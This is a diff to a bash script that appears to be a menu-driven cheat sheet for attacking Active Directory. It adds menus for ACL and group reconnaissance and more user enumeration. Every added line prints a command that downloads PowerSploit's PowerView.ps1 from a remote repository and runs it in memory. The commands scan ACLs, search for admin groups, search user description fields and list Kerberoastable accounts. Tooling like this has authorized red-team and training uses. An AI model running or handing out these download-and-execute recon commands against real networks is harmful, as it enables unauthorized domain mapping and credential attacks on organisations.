@@ -157,27 +157,56 @@ echo -ne " Select Domain Recon Type
 
 
 
-	1)  ->	[ Domain Controllers 		]
-        2)  ->  [ Domain Computers and Servers 	]
-        3)  ->	[ Domain Forests 		]
-        4)  ->	[ Domain GPO's			]
-        5)  -> 	[ Domain Policies 		]
-        6)  ->	[ Domain Trusts 		]
-        7)  ->  [ Domain Users 			]
+	1)  ->	[ Domain ACL's			]
+	2)  -> 	[ Domain Controllers		]
+        3)  ->  [ Domain Computers and Servers 	]
+        4)  ->	[ Domain Forests 		]
+        5)  ->	[ Domain GPO's			]
+        6)  ->	[ Domain Groups			]
+        7)  -> 	[ Domain Policies 		]
+        8)  ->	[ Domain Trusts 		]
+        9)  ->  [ Domain Users 			]
 "
         read a
         case $a in
-        	1) Internal_Menu_Recon_Domain_Controllers ;;
-	        2) Internal_Menu_Recon_Domain_Computers_Servers ;;
-	        3) Internal_Menu_Recon_Domain_Forests ;;
-	        4) Internal_Menu_Recon_Domain_GPO ;;
-	        5) Internal_Menu_Recon_Domain_Policies ;;
-	        6) Internal_Menu_Recon_Domain_Trusts ;;
-	        7) Internal_Menu_Recon_Domain_Users ;;
+        	1) Internal_Menu_Recon_Domain_ACL ;;
+        	2) Internal_Menu_Recon_Domain_Controllers ;;	
+	        3) Internal_Menu_Recon_Domain_Computers_Servers ;;
+	        4) Internal_Menu_Recon_Domain_Forests ;;
+	        5) Internal_Menu_Recon_Domain_GPO ;;
+	        6) Internal_Menu_Recon_Domain_Groups ;;
+	        7) Internal_Menu_Recon_Domain_Policies ;;
+	        8) Internal_Menu_Recon_Domain_Trusts ;;
+	        9) Internal_Menu_Recon_Domain_Users ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
 }
+
+
+Internal_Menu_Recon_Domain_ACL(){
+
+	clear
+	
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${IBLUE}Search for interesting ACEs${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-ACLScanner -ResolveGUIDs"
+echo -e ""
+echo -e "${IBLUE}Get ACLs for specific AD Object${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-ObjectACL -SamAccountName <SAM> -ResolveGUIDs"
+echo -e ""
+echo -e "${IBLUE}Get ACLs for specified prefix${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-ObjectACL -ADSprefix 'CN=Administrators,CN=Users' -Verbose"
+echo -e ""
+echo -e "${IBLUE}Get ACLs for specified prefix${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-PathACL -Path '\\\\\\\\Security.local\SYSVOL'"
+echo -e ""
+echo -e "" 
+
+}
+
 
 Internal_Menu_Recon_Domain_Controllers(){
 
@@ -271,6 +300,32 @@ echo -e "${IBLUE}Get GPO's in Domain${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO | Select DisplayName"
 echo -e ""
+echo -e "${IBLUE}Get GPO's applied to specific OU${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO -ADSpath ((Get-NetOU '<OU-Name>' -FullData).gplink.split(';')[0] -replace '^.')"
+echo -e ""
+echo -e ""
+
+}
+
+Internal_Menu_Recon_Domain_Groups() {
+
+	clear
+ 
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${IBLUE}List all Groups${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup"
+echo -e ""
+echo -e "${IBLUE}List all Groups with partial wilcard${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup "\"*admin*"\""
+echo -e ""
+echo -e "${IBLUE}Identify interesting groups on a Domain Controller${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup Get-NetDomainController | Get-NetLocalGroup -Recurse"
+echo -e ""
+echo -e "${IBLUE}List Groups of which a user is a member of${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup Get-NetLocalGroup -Username '<Username>'"
+echo -e ""
 echo -e ""
 
 }
@@ -334,6 +389,12 @@ echo -e "${IBLUE}User Properties${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Properties Name,SamAccountName,Description | Sort Name"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Properties SamAccountName,Description | Sort SamAccountName"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Properties Name,Description,pwdlastset,badpwdcount | Sort Name"
+echo -e ""
+echo -e "${IBLUE}Specific user account${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Username '<Username>'"
+echo -e ""
+echo -e "${IBLUE}Search for string in User Description field${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Find-UserField -SearchField Description -SearchTerm 'built'"
 echo -e ""
 echo -e "${IBLUE}Kerberoastable Users${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -SPN | Select name,ServicePrincipalName | Sort Name"
@@ -476,4 +537,3 @@ echo -ne "
 
 # Call the menu function
 Main_Menu
-
